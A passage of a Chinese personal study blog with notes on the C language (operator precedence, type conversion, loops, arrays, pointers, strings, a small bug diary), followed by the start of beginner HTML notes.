不要把间接运算符和二元乘法运算符（*）混淆，虽然它们使用的符号相同，但语法功能不同。
运算符的优先级


优先级
运算符
结合律



1
后缀运算符：[]   ()   ·   -&gt;   ++   –(类型名称){列表}
从左到右


2
一元运算符：++   –   !   ~   +   -   *   &amp;   sizeof_Alignof
从右到左


3
类型转换运算符：(类型名称)
从右到左


4
乘除法运算符：*   &#x2F;   %
从左到右


5
加减法运算符：+   -
从左到右


6
移位运算符：&lt;&lt;   &gt;&gt;
从左到右


7
关系运算符：&lt;&lt;&#x3D;   &gt;&gt;&#x3D;
从左到右


8
相等运算符：&#x3D;&#x3D;   !&#x3D;
从左到右


9
位运算符 AND：&amp;
从左到右


10
位运算符 XOR：^
从左到右


11
位运算符 OR：|
从左到右


12
逻辑运算符 AND：&amp;&amp;
从左到右


13
逻辑运算符 OR：||
从左到右


14
条件运算符：?:
从右到左


15
赋值运算符：    &#x3D;     +&#x3D;     -&#x3D;    *&#x3D;    &#x2F;&#x3D;    %&#x3D;    &amp;&#x3D;    ^&#x3D;    |&#x3D;     &lt;&lt;&#x3D;    &gt;&gt;&#x3D;
从右到左


16
逗号运算符：，
从左到右


total += *start++;

一元运算*和++的优先级相同，但结合律是从右往左，所以start++先求值，然后才是*start
类型转化在语句和表达式中，如果使用混合类型，C会采用一套规则进行自动类型转换。
基本的类型转换规则

当类型转换出现在表达式时，无论是unsigned还是signed的char和short都会被自动转换成int，如有必要会被转换成unsigned int
涉及两种类型的运算，两个值会被分别转换成两种类型的更高级别。
在赋值表达式语句中，计算的最终结果会被转换成被赋值变量的类型。这个过程可能导致类型升级或降级
当作为函数参数传递时，char和short被转换成int，float被转换成double。

类型升级通常都不会有什么问题，但是类型降级会导致较低类型可能放不下整个数字。
强制类型转换运算符有时需要进行精确的类型转换，或者在程序中表明类型转换的意图。这种情况下要用到强制类型转换（cast），即在某个量的前面放置用圆括号括起来的类型名
mice = 1.6 + 1.7;mice = (int)1.6 + (int)1.7;

第1行使用自动类型转换。首先，1.6和1.7相加得3.3。然后，为了匹配int 类型的变量，3.3被类型转换截断为整数3。第2行，1.6和1.7在相加之前都被转换成整数（1），所以把1+1的和赋给变量mice。
本章注意点：
许多其他语言都会回避该程序中的三重赋值，但是C完全没问题。赋值的顺序是从右往左
在C语言中，除法操作默认会执行整数除法，即如果操作数都是整数，结果将会是整数，而不是浮点数.整数除法会截断计算结果的小数部分（丢弃整个小数部分），不会四舍五入结果.
在定义函数时，需要在最上面进行函数原型声明
未进行函数的声明或未指定参数类型的情况下，会导致参数升级为不正确的数据类型，在函数调用中显式使用强制类型转换，可以修复这个问题：
pound ((int)f); // 把f强制类型转换为正确的类型

（所以最好在开头进行函数的原型声明）

循环while循环使用格式
while(判断条件)//此处不加；    条件成立的执行语句；

while通过括号的数值最后是否为0来进行判断一个真假，若为0则为假，若不为0则为真（但c语言中0为假，而1为真）。
while()后加;表示执行空语句
for循环使用格式
for(语句a;语句b;语句c)

第1个表达式是初始化，只会在for循环开始时执行一次。第 2 个表达式是测试条件，在执行循环之前对表达式求值。如果表达式为假，循环结束。第3个表达式执行更新，在每次循环结束时执行。
注：在for循环中，可以省略一个或多个语句，但分号不能省略。
在for语句的（）所定义的变量是局部变量，只在此for循环内的语句中有效
do….while循环使用格式
do    执行语句//可为单一语句或者复合语句while ( 判断条件 )；//此处一定要加分号

do while循环在执行完循环体后才执行测试条件，所以至少执行循环体一次
本章注意点：
逻辑判断符号与赋值符号不要混淆while(a == 1);//语句一while(a = 1);//语句二

语句一中为判断a是否等于1
语句二为将1赋值给a，最后将1的参数给while最后造成语句二的循环不断进行

分支与跳转if、else、else if语句使用格式
if(判断语句)//此处不加分号  执行语句；//可为单语句或多语句else if()  执行语句；//可为单语句或多语句else()  执行语句；//可为单语句或多语句

else与if配对原则：else与离它最近的if匹配，除非最近的if被花括号括起来
数值的范围判断问题continue语句​	continue 语句让程序跳过continue 语句后在循环内的代码，让程序重新进入循环。
​	continue还可用作占位符。例如，下面的循环读取并丢弃输入的数据，直至读到行末尾：
while (getchar() != &#x27;\n&#x27;)	continue;



break语句程序执行到循环中的break语句时，会终止包含它的循环，并继续执行下一阶段。
多重选择：switch和break使用格式
switch (整数值（包括char类型）。)&#123;case 值://表达式中只包含整型常量	执行语句	break;case 值://表达式中只包含整型常量	执行语句	break;default:	执行语句&#125;

注：switch只处理了第1个字符
break语句让程序离开switch语句，跳至switch语句后面的下一条语句。如果没有break语句，就会从匹配标签开始执行到switch末尾
break 语句可用于循环和switch 语句中， 但是continue只能用于循环中。
case多重标签可以在switch语句中使用多重case标签
switch (ch)&#123;case &#x27;a&#x27;:case &#x27;A&#x27;: a_ct++;	break;case &#x27;e&#x27;:case &#x27;E&#x27;: e_ct++;	break;default: break;&#125;

假设如果ch是字母a，switch语句会定位到标签为case &#39;a&#39; :的位置。由于该标签没有关联break语句，所以程序流直接执行下一条语句，即a_ct++;。如果 ch是字母A，程序流会直接定位到case &#39;A&#39; :。本质上，两个标签都指的是相同的语句。
getchar()和putchar()函数getchar()函数不带任何参数，它从输入队列中返回下一个字符。例如，下面的语句读取下一个字符输入，并把该字符的值赋给变量ch：
ch = getchar();scanf(&quot;%c&quot;, &amp;ch);//与上一句等效

putchar()函数打印它的参数。例如，下面的语句把之前赋给ch的值作为字符打印出来：
putchar(ch);printf(&quot;%c&quot;, ch);//于上一句等效

由于这些函数只处理字符， 所以它们比更通用的scanf() 和printf()函数更快、更简洁。而且，注意 getchar()和 putchar()不需要转换说明，因为它们只处理字符。这两个函数通常定义在 stdio.h头文件
ctype.h库​	C 有一系列专门处理字符的函数，ctype.h头文件包含了这些函数的原型。这些函数接受一个字符作为参数， 如果该字符属于某特殊的类别， 就返回一个非零值（真）；否则，返回0（假）。


数组数组（array）是按顺序储存的一系列类型相同的值。
float debts[20];

声明debts是一个内含20个元素的数组，每个元素都可以储存float 类型的值。数组的第1 个元素是debts[0] ， 第2 个元素是debts[1]，以此类推，直到debts[19]。
注意，数组元素的编号从0开始，不是从1开始。
字符组与字符串的差别
字符串最末尾有由空字符\0，而字符组没有。如果char类型的数组末尾包含一个表示字符串末尾的空字符\0，则该数组中的内容就构成了一个字符串
指定数组大小在C99标准之前，声明数组时只能在方括号中使用整型常量表达式。所谓整型常量表达式，是由整型常量构成的表达式。
int n = 5;int m = 8;float a1[5]; // 可以float a2[5*2 + 1]; //可以float a3[sizeof(int) + 1]; //可以float a4[-4]; // 不可以，数组大小必须大于0float a5[0]; // 不可以，数组大小必须大于0float a6[2.5]; // 不可以，数组大小必须是整数float a7[(int)2.5]; // 可以，已被强制转换为整型常量float a8[n]; // C99之前不允许float a9[m]; // C99之前不允许





未指定数组大小编译器会把数组的大小设置为足够装得下初始化的值。
初始化数组int powers[8] = &#123;1,2,4,6,8,16,32,64&#125;; /* 从ANSI C开始支持这种初始化 */

如上所示，用以逗号分隔的值列表（用花括号括起来）来初始化数组，各值之间用逗号分隔。在逗号和值之间可以使用空格。根据上面的初始化，把 1 赋给数组的首元素（powers[0]），以此类推
除在声明时可使用&#123;&#125;对数组进行赋值，其他时候只能用变量[序号] = 对数组进行逐一赋值
注：使用const声明数组，可把数组设置为只读
声明数组形参​	因为数组名是该数组首元素的地址，作为实际参数的数组名要求形式参数是一个与之匹配的指针。只有在这种情况下，C才会把int ar[]和int * ar解释成一样。也就是说，ar是指向int的指针。由于函数原型可以省略参数名，所以下面4种原型都是等价的：
int sum(int *ar, int n);int sum(int *, int);int sum(int ar[], int n);int sum(int [], int);

但是，在函数定义中不能省略参数名。
指定初始化器（适用于C99）int arr[6] = &#123;[5] = 212&#125;; // 把arr[5]初始化为212

而C99规定，可以在初始化列表中使用带方括号的下标指明待初始化的元素
指定初始化的一些特性
int days[MONTHS] = &#123; 31, 28, [4] = 31, 30, 31, [1] = 29 &#125;;


如果指定初始化器后面有更多的值，那么后面这些值将被用于初始化指定元素后面的元素。如该例中的初始化列表中的片段：[4] &#x3D;31,30,31，那么后面这些值将被用于初始化指定元素后面的元素。
第二，如果再次初始化指定的元素，那么最后的初始化将会取代之前的初始化。。例如，程序清单10.5中，初始化列表开始时把days[1]初始化为28，但是days[1]又被后面的指定初始化[1] &#x3D;29初始化为29。

二维数组声明数据类型 变量[主数组个数][每个主数组所需的个数]



初始化例：
float rain[5][12] =&#123;&#123;4.3,4.3,4.3,3.0,2.0,1.2,0.2,0.2,0.4,2.4,3.5,6.6&#125;,&#123;8.5,8.2,1.2,1.6,2.4,0.0,5.2,0.9,0.3,0.9,1.4,7.3&#125;,&#123;9.1,8.5,6.7,4.3,2.1,0.8,0.2,0.2,1.1,2.3,6.1,8.4&#125;,&#123;7.2,9.9,8.4,3.3,1.2,0.8,0.4,0.0,0.6,1.7,4.3,6.2&#125;,&#123;7.6,5.6,3.8,2.8,3.8,0.2,0.0,0.0,0.0,1.3,2.6,5.2&#125;&#125;;

初始化时也可省略内部的花括号，只保留最外面的一对花括号。只要保证初始化的数值个数正确，初始化的效果与上面相同。但是如果初始化的数值不够，则按照先后顺序逐行初始化，直到用完所有的值。
其他多维数组二维数组的相关内容都适用于三维数组或更多维的数组。
const修饰数组const int days[MONTHS] = &#123;31,28,31,30,31,30,31,31,30,31,30,31&#125;;

如果程序稍后尝试改变数组元素的值，编译器将生成一个编译期错误消息。
如果此时声明指向这个const数组，此时指针也必须用const修饰，且不能修改解引用指针的值，否则都将报错。
*pd = 29.89; // 不允许pd[2] = 222.22; //不允许

但可以进行指针加法
pd++; /* 让pd指向rates[1] -- 没问题 */

注意：
把const数据或非const数据的地址初始化为指向const的指针或为其赋值是合法的，此时不能修改解引用指针的值
变长数组（适用C99）在创建数组时，可以使用变量指定数组的维度。
注：变长数组中的“变”不是指可以修改已创建数组的大小。一旦创建了变长数组，它的大小则保持不变。这里的“变”指的是：
声明一个带二维变长数组参数的函数int sum2d(int rows, int cols, int ar[rows][cols]);

注：前两个形参（rows和cols）用作第3个形参二维数组ar的两个维度。因为ar的声明要使用rows和cols，所以在形参列表中必须在声明ar之前先声明这两个形参。
以下为错误写法
int sum2d(int ar[rows][cols], int rows, int cols);

变形
C99&#x2F;C11标准规定，可以省略原型中的形参名，但是在这种情况下，必须用星号来代替省略的维度：
int sum2d(int, int, int ar[*][*]);

需要注意的是

在函数定义的形参列表中声明的变长数组并未实际创建数组。
和传统的语法类似，变长数组名实际上是一个指针。这说明带变长数组形参的函数实际上是在原始数组中处理数组，因此可以修改传入的数组。

复合字面量（使用C99）字面量是除符号常量外的常量。例如，5是int类型字面量， 81.3是double类型的字面量
创建下面的复合字面量创建了一个和diva数组相同的匿名数组，也有两个int类型的值：
(int [2])&#123;10, 20&#125; // 复合字面量

其中int [2]即是复合字面量的类型名。
初始化有数组名的数组时可以省略数组大小，复合字面量也可以省略大小，编译器会自动计算数组当前的元素个数：
(int [])&#123;50, 20, 90&#125; // 内含3个元素的复合字面量

使用因为复合字面量是匿名的，所以不能先创建然后再使用它，必须在创建的同时使用它
用法一：使用指针记录地址
int * pt1;pt1 = (int [2]) &#123;10, 20&#125;;

用法二：把复合字面量作为实际参数传递给带有匹配形式参数的函数
int sum(const int ar[], int n);...int total3;total3 = sum((int [])&#123;4,4,4,5,5,5&#125;, 6);





本章注意点：
数组名是数组首元素的地址。如果flizny是一个数组，下面的语句成立：
flizny == &amp;flizny[0]; // 数组名是该数组首元素的地址



多维数组的双重间接性质假设有下面的声明：
int zippo[4][2]; /* 内含int数组的数组 */


然后数组名zippo是该数组首元素的地址。
1.因为zippo是数组首元素的地址，所以zippo的值和&amp;zippo[0]的值相同。而zippo[0]本身是一个内含两个整数的数组，所以zippo[0]的值和它首元素（一个整数）的地址（即&amp;zippo[0][0]的值）相同。
简而言之，zippo[0]是一个占用一个int大小对象的地址，而zippo是一个占用两个int大小对象的地址。由于这个整数和内含两个整数的数组都开始于同一个地址，所以zippo、zippo[0]、zippo[0][0]的值相同。
2.给指针或地址加1，其值会增加对应类型大小的数值。在这方面，zippo和zippo[0]不同，因为zippo指向的对象占用了两个int大小，而zippo[0] 指向的对象只占用一个int 大小。因此， zippo + 1 和zippo[0] + 1的值不同。
3.**zippo与*&amp;zippo[0][0]等价，这相当于zippo[0][0]
4.解引用一个指针（在指针前使用*运算符）或在数组名后使用带下标的[]运算符，得到引用对象代表的值。其中解引用主数组的结果就是次数组，即 *zippo == zippo[0]成立。
总结：将数组理解成数组的数组。因占用地址为首元素的数据类型大小及其个数，zippo[0]是一个占用一个int大小对象的地址，而zippo是一个占用两个int大小对象的地址。由于主数组为zippo[]的合集，故zippo + 1 和zippo[0] + 1的值不同。即zippo + 1 == zippo[1]成立，zippo[0]+1 == zippo[0][1]。解引用主数组形参就是得到主数组的第一个值，也就是次数组zippo[0]

数组中sizeof()的使用在数组中sizeof()被视为整型常量，可以用于声明数组内的数目，如
int a[sizeof(int)];









指针指针（pointer）是一个值为内存地址的变量（或数据对象）。
声明指针1.声明变量的指针因声明指针变量时必须指定指针所指向变量的类型，因为不同的变量类型占用不同的存储空间，一些指针操作要求知道操作对象的大小。另外，程序必须知道储存在指定地址上的数据类型。
以下为声明指针的例子
int * pi; // pi是指向int类型变量的指针char * pc; // pc是指向char类型变量的指针float * pf, * pg; // pf、pg都是指向float类型变量的指针

类型说明符表明了指针所指向对象的类型，星号（*）表明声明的变量是一个指针。
2.声明多维数组的指针多维数组的指针会有不同大小的地址，因此多维数组的指针在声明是必须指向一个内含对应个数和对应文件类型的数组
例如：
int (* pz)[2]; // pz指向一个内含两个int类型值的数组

前面有圆括号的版本，*先与pz结合，因此声明的是一个指向数组（内含两个int类型的值）的指针。
区别于：
int * pax[2]; // pax是一个内含两个指针元素的数组，每个元素都指向int的指针

由于[]优先级高，先与pax结合，所以pax成为一个内含两个元素的数组。然后*表示pax数组内含两个指针。最后，int表示pax数组中的指针都指向int类型的值。因此，这行代码声明了两个指向int的指针
3.声明函数指针方式一
函数返回类型 (*指针名)(函数列表); // 声明函数指针指针名 = 函数名; // 将add函数的地址赋值给函数指针（函数名实际上是函数地址）

方式二
函数返回类型 (*指针名)(函数列表) = &amp;函数名; // 声明并初始化函数指针



4.声明指向指针的指针指向的指针数据类型** 指针名 = &amp;被指向的指针

例如：
int* ptr = &amp;num;        // 指向int类型的指针int** ptrToPtr = &amp;ptr;  // 指向int*类型的指针



8种基本用法
赋值
解引用
取址
指针与整数相加
递增指针
指针减去一个整数
递减指针
指针求差

注：

关系运算符可以比较两个指针的值

可以用一个指针减去另一个指针得到一个整数，或者用一个指针减去一个整数得到另一个指针。

指针和指针不能直接相加


指针运算与递增递减操作特别注意，只有指针变量可以进行递增递减操作，如数组名，字符串常量等指针常量等不能进行递增递减操作。
char a[] = &quot;NO&quot;char * pi = &quot;YES&quot;++pi; //正确++a;  //错误






解引用未初始化的指针切记：创建一个指针时，系统只分配了储存指针本身的内存，并未分配储存数据的内存。
指针未被初始化，其值是一个随机值，所以不知道5将储存在何处。这可能不会出什么错，也可能会擦写数据或代码，或者导致程序崩溃
函数指针在C语言中，函数指针允许我们将函数的地址存储在指针变量中，并通过该指针变量来调用函数。其调用格式与函数相同。
指针名（参数列表）;

使用实例：
#include &lt;stdio.h&gt;int add(int a, int b) &#123;    return a + b;&#125;int subtract(int a, int b) &#123;    return a - b;&#125;int main() &#123;    int (*operation)(int, int); // 声明函数指针    operation = add; // 将add函数的地址赋值给函数指针    printf(&quot;Addition: %d\n&quot;, operation(2, 3)); // 调用add函数    operation = subtract; // 将subtract函数的地址赋值给函数指针    printf(&quot;Subtraction: %d\n&quot;, operation(5, 3)); // 调用subtract函数    return 0;&#125;



指针的兼容性指针之间的赋值比数值类型之间的赋值要严格。两个类型的指针不能相互赋值。
本章注意点：
指针加法在C中，指针加1指的是增加一个存储单元，指针加1的操作并不是简单地将指针的值增加1，而是将指针向后移动一个存储单元的大小。。对数组而言，这意味着把加1后的地址是下一个元素的地址，而不是下一个字节的地址。
函数函数的声明、定义与引用函数的声明函数定义的数据返回类型 函数名(参数列表);

函数的定义数据返回类型 函数名(参数列表)&#123;	函数体	return 返回变量;&#125;

函数引用函数名(参数列表)



函数参数的传递1.变量编写一个处理基本类型（如，int）的函数时，要选择是传递int类型的值还是传递指向int的指针。通常都是直接传递数值，只有程序需要在函数中改变该数值时，才会传递指针
这意味着在C语言中，函数参数传递是按值传递的，这意味着在函数调用时，实参的值会被复制到形参中。实参不会因为函数中的语句而被修改，但可利用指针，修改实参的内存地址所对应的值来进行修改实参。
例：交换两个参数
#include &lt;stdio.h&gt;void interchange(int* u, int* v);int main(void) &#123;    int x = 5, y = 10;    printf(&quot;Originally x = %d and y = %d.\n&quot;, x, y);    interchange(&amp;x, &amp;y);    printf(&quot;Now x = %d and y = %d.\n&quot;, x, y);    return 0;&#125;void interchange(int* u, int* v) &#123;    int temp;    temp = *u;/*u的值是&amp;x，所以u指向x。这意味着用*u即可表示x的值，这正是我们需要的。不要写成这样：	temp = u;*/    *u = *v;/*    这条语句相当于：	x = y;*/    *v = temp;&#125;



2.数组​	对于数组别无选择，必须传递指针，因为这样做效率高。如果一个函数按值传递数组，则必须分配足够的空间来储存原数组的副本，然后把原数组所有的数据拷贝至新的数组中。如果把数组的地址传递给函数，让函数直接处理原数组则效率要高。
字符串定义字符串​	用双引号括起来的内容称为字符串字面量（string literal），也叫作字符串常量（string constant）。双引号中的字符和编译器自动加入末尾的\0字符， 都作为字符串储存在内存中
const char m1[40] = &quot;Limit yourself to one line&#x27;s worth.&quot;//等价于const char m1[40] = &#123; &#x27;L&#x27;,&#x27;i&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;y&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;r&#x27;,&#x27;s&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;f&#x27;, &#x27; &#x27;, &#x27;t&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27; &#x27;,&#x27;l&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;e&#x27;,&#x27;\&quot;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;,&#x27;t&#x27;, &#x27;h&#x27;, &#x27;.&#x27;, &#x27;\0&#x27; &#125;;



字符串常量例如：
#define NAME &quot;HeyJWEI&quot;

char类型数组例如：
char name[] = &quot;HEYJW&quot;;

指向char的指针例如：
const char * pi = &quot;HeyJWEI&quot;;



注：如果要在字符串内部使用双引号，必须在双引号前面加上一个反斜杠（\）
字符串串联规则：从ANSI C标准起，如果字符串字面量之间没有间隔，或者用空白字符分隔（包括换行），C会将其视为串联起来的字符串字面量。
数组形式和指针形式的区别数组
​	数组形式在计算机的内存中分配为一个内含 字母数+1 个元素的数组（每个元素对应一个字符，还加上一个末尾的空字符’\0’），每个元素被初始化为字符串字面量对应的字符。通常，字符串都作为可执行文件的一部分储存在数据段中。当把程序载入内存时，也载入了程序中的字符串。字符串储存在静态存储区（static memory）中。但是，程序在开始运行时才会为该数组分配内存。此时，才将字符串拷贝到数组中。注意，此时字符串有两个副本。一个是在静态内存中的字符串字面量，另一个是储存在数组中的字符串。
即以下流程	

字符串的内存分配

字符串的初始化

字符串的存储位置

字符串的拷贝
注：此时编译器便把数组名识别为该数组首元素地址（&amp;数组名[0]）的别名。这里关键要理解，在数组形式中，数组名是地址常量。不能更改ar1，如果改变了ar1，则意味着改变了数组的存储位置（即地址）。可以进行类似 数组名+1这样的操作，标识数组的下一个元素。但是不允许进行++数组名这样的操作。


指针指针形式（*pt1）也使得编译器为字符串在静态存储区预留元素的空间。另外，一旦开始执行程序，它会为指针变量pt1留出一个储存位置，并把字符串的地址储存在指针变量中。
注：
​	该变量最初指向该字符串的首字符，但是它的值可以改变。因此，可以使用递增运算符。例如，++pt1将指向第 2 个字符
​	用双引号括起来的内容被视为指向该字符串储存位置的指针(类似于字符数组的指针，只指向第一个字母)。这类似于把数组名作为指向该数组位置的指针。
注：字符串字面量被视为const数据。由于pt1指向这个const数据，所以应该把pt1声明为指向const数据的指针。这意味着不能用pt1改变它所指向的数据，但是仍然可以改变pt1的值（即，pt1指向的位置）。如果把一个字符串字面量拷贝给一个数组，就可以随意改变数据，除非把数组声明为const。
puts()函数
和printf()函数一样，puts()函数也属于stdio.h系列的输入&#x2F;输出函数。但是，与printf()不同的是，puts()函数只显示字符串，而且自动在显示的字符串末尾加上换行符
一些神奇的语句学习过程中碰到了一些我觉得很神奇的语句
1.逻辑运算符在赋值中的直接使用
a = (10==2);//此时a = 0



2.在while()中嵌入scanf()函数
while(scanf(&quot;%d&quot;,&amp;a));//此时程序先运行scanf()函数后将函数的返回值输入给while，若为整数则返回1，若为非整数则返回0



3.在while()中的括号中填入数字
while(1);//若括号中的数值不为0，即可执行while循环



4.可利用scanf()的返回值对变量进行赋值
a = scanf(&quot;%d&quot;,&amp;c)



5.获取字符同时进行判断
while ((ch = getchar()) != &#x27;\n&#x27;)

等同于
while ((ch = getchar()) // 给ch赋一个值!= &#x27;\n&#x27;) // 把ch和\n作比较

但区别于
while (ch = getchar() != &#x27;\n&#x27;)

​	!&#x3D;运算符的优先级比&#x3D;高，所以先对表达式getchar() !&#x3D; ‘\n’求值。由于这是关系表达式，所以其值不是1就是0（真或假）。然后，把该值赋给ch。
6.由于C保证在给数组分配空间时，指向数组后面第一个位置的指针仍是有效的指针。可写出一些简洁的函数
/* sum_arr2.c -- 数组元素之和 */#include &lt;stdio.h&gt;#define SIZE 10int sump(int * start, int * end);int main(void)&#123;int marbles[SIZE] = &#123; 20, 10, 5, 39, 4,16, 19, 26, 31, 20 &#125;; long answer;answer = sump(marbles, marbles + SIZE);printf(&quot;The total number of marbles is%ld.\n&quot;, answer);return 0;&#125;/* 使用指针算法 */int sump(int * start, int * end)&#123;int total = 0;while (start &lt; end)&#123;total += *start; // 把数组元素的值加起来start++; // 让指针指向下一个元素&#125; return total;&#125;

注意，使用这种“越界”指针（超出数组有含义的内存地址）的函数调用更为简洁
7.多维数组的解引用与加法操作
（*(*(zippo+2) + 1)） //代替数组表示法（zippo[2][1]）





Bug日记1.for循环局部变量错误
源代码
#include &lt;stdio.h&gt;#define MONTHS 12    // number of months in a year#define YEARS   5    // number of years of dataint main(void) &#123;	// initializing rainfall data for 2010 - 2014	float rain[YEARS][MONTHS] = &#123;		&#123;4.3, 4.3, 4.3, 3.0, 2.0, 1.2, 0.2, 0.2, 0.4, 2.4, 3.5, 6.6&#125;,		&#123;8.5, 8.2, 1.2, 1.6, 2.4, 0.0, 5.2, 0.9, 0.3, 0.9, 1.4, 7.3&#125;,		&#123;9.1, 8.5, 6.7, 4.3, 2.1, 0.8, 0.2, 0.2, 1.1, 2.3, 6.1, 8.4&#125;,		&#123;7.2, 9.9, 8.4, 3.3, 1.2, 0.8, 0.4, 0.0, 0.6, 1.7, 4.3, 6.2&#125;,		&#123;7.6, 5.6, 3.8, 2.8, 3.8, 0.2, 0.0, 0.0, 0.0, 1.3, 2.6, 5.2&#125;	&#125;;	int year, month;	float subtot = 1, total;	printf(&quot; YEAR    RAINFALL  (inches)\n&quot;);	for (year = 0, total = 0; year &lt; YEARS; year++) &#123;		// for each year, sum rainfall for each month		subtot = 0;		for (float *zhizheng = rain[year], subtot = 0; zhizheng &lt; &amp;rain[year][MONTHS] ; zhizheng++)//错误地方			subtot +=  *zhizheng;		printf(&quot;%5d %15.1f\n&quot;, 2010 + year, subtot);		total += subtot; // total for all years	&#125;	return 0;&#125;

在错误的for循环处，subtot被重新定义，变成for循环的局部变量
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML笔记</title>
    <url>/posts/2607722179/</url>
    <content><![CDATA[HTML简介HTML（HyperText Markup Language）是用来描述网页的一种语言。
HTML标签
HTML 标签是由尖括号包围的关键词，比如 &lt;html&gt;
HTML 标签通常是成对出现的，比如 &lt;b&gt; 和 &lt;/b&gt;
标签对中的第一个标签是开始标签，第二个标签是结束标签

注：”HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思。
HTML声明&lt;!DOCTYPE&gt;声明有助于浏览器中正确显示网页。doctype 声明是不区分大小写的
HTML实例
&lt;!DOCTYPE html&gt;   &lt;!-- 声明为HTML5文档 --&gt;&lt;!-- HTML页面开始 --&gt;&lt;html&gt;	&lt;!-- 头部元素开始 --&gt;	&lt;head&gt;	&lt;meta charset=&quot;utf-8&quot;&gt;	&lt;title&gt;HTML&lt;/title&gt;	&lt;/head&gt;	&lt;!-- 头部元素结束 --&gt;        &lt;!-- 可见的页面内容开始 --&gt;	&lt;body&gt;	&lt;h1&gt;我的第一个标题&lt;/h1&gt;	&lt;p&gt;我的第一个段落。&lt;/p&gt; 	&lt;/body&gt;     &lt;!-- 可见的页面内容结束 --&gt;&lt;/html&gt;&lt;!-- HTML页面结束 --&gt;



HTML基础构成标题HTML 标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签来定义的。
&lt;h1&gt;这是标题 1&lt;/h1&gt;&lt;h2&gt;这是标题 2&lt;/h2&gt;&lt;h3&gt;这是标题 3&lt;/h3&gt;&lt;h4&gt;这是标题 4&lt;/h4&gt;&lt;h5&gt;这是标题 5&lt;/h5&gt;&lt;h6&gt;这是标题 6&lt;/h6&gt;



段落HTML 段落是通过标签 &lt;p&gt; 来定义的。
&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;



水平线&lt;hr&gt; 标签在 HTML 页面中创建水平线,可用于分隔内容。
&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;




注释语法
&lt;!-- 这是一个注释 --&gt;



折行&#x2F;换行在不产生一个新段落的情况下进行换行（新行），请使用 &lt;br&gt; 标签
&lt;p&gt;这个&lt;br&gt;段落&lt;br&gt;演示了分行的效果&lt;/p&gt;

注意：&lt;br&gt; 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。
空格的使用对于 HTML，无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。
当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。
&lt;p&gt;    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。&lt;/p&gt;&lt;p&gt;注意，浏览器忽略了源代码中的排版（省略了多余的空格和换行）。&lt;/p&gt;



HTML文本格式化标签文本加粗&lt;b&gt;这个文本是加粗的&lt;/b&gt;

&lt;strong&gt;这个文本是加粗的&lt;/strong&gt;



文字放大与缩小&lt;big&gt;这个文本字体放大&lt;/big&gt;

&lt;small&gt;这个文本是缩小的&lt;/small&gt;



文字斜体&lt;em&gt;这个文本是斜体的&lt;/em&gt;

&lt;i&gt;这个文本是斜体的&lt;/i&gt;



上下标这个文本包含&lt;sub&gt;下标&lt;/sub&gt;

这个文本包含&lt;sup&gt;上标&lt;/sup&gt;



定义预格式文本&lt;pre&gt;此例演示如何使用 pre 标签对空行和    空格进行控制&lt;/pre&gt;


注：HTML未对此处的空格和换行进行处理为一个空格
定义缩写&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;&lt;br /&gt;&lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;&lt;p&gt;在某些浏览器中，当您把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。&lt;/p&gt;&lt;p&gt;仅对于 IE 5 中的 acronym 元素有效。&lt;/p&gt;&lt;p&gt;对于 Netscape 6.2 中的 abbr 和 acronym 元素都有效。&lt;/p&gt;



文字方向&lt;p&gt;该段落文字从左到右显示。&lt;/p&gt;  &lt;p&gt;&lt;bdo dir=&quot;rtl&quot;&gt;该段落文字从右到左显示。&lt;/bdo&gt;&lt;/p&gt;  



引用短引用&lt;q&gt;Build a future where people live in harmony with nature.&lt;/q&gt;



长引用&lt;blockquote cite=&quot;http://www.worldwildlife.org/who/index.html&quot;&gt;For 50 years, WWF has been protecting the future of nature. The worlds leading conservation organization, WWF works in 100 countries and is supported by 1.2 million members in the United States and close to 5 million globally.&lt;/blockquote&gt;




下划线(插入线)与删除线&lt;p&gt;My favorite color is &lt;del&gt;blue&lt;/del&gt; &lt;ins&gt;red&lt;/ins&gt;!&lt;/p&gt;



标签所对应的全拼&lt;b&gt;---bold&lt;em&gt;---emphasize&lt;i&gt;---italic&lt;sub&gt;---subscript&lt;sup&gt;---superscript&lt;ins&gt;---insert&lt;del&gt;---delete&lt;kbd&gt;---keyboard&lt;bdo&gt;---Bi-Directional Override&lt;q&gt;---quote&lt;dfn&gt;---define



HTML元素开始标签常被称为起始标签（opening tag），结束标签常称为闭合标签（closing tag)
语法
HTML 元素以开始标签起始
HTML 元素以结束标签终止
元素的内容是开始标签与结束标签之间的内容
某些 HTML 元素具有空内容（empty content）
空元素在开始标签中进行关闭（以开始标签的结束而结束）
大多数 HTML 元素可拥有属性

HTML 元素的嵌套大多数 HTML 元素可以嵌套（HTML 元素可以包含其他 HTML 元素）。
无结束标签即使忘记了使用结束标签，大多数浏览器也会正确地显示 HTML。忘记使用结束标签会产生不可预料的结果或错误。
HTML属性属性是 HTML 元素提供的附加信息。
实例
&lt;a href=&quot;https://heyhjwei.github.io/&quot;&gt;这是一个链接使用了 href 属性&lt;/a&gt;

HTML 链接由 &lt;a&gt; 标签定义。链接的地址在 href 属性中指定
引用属性值的方法

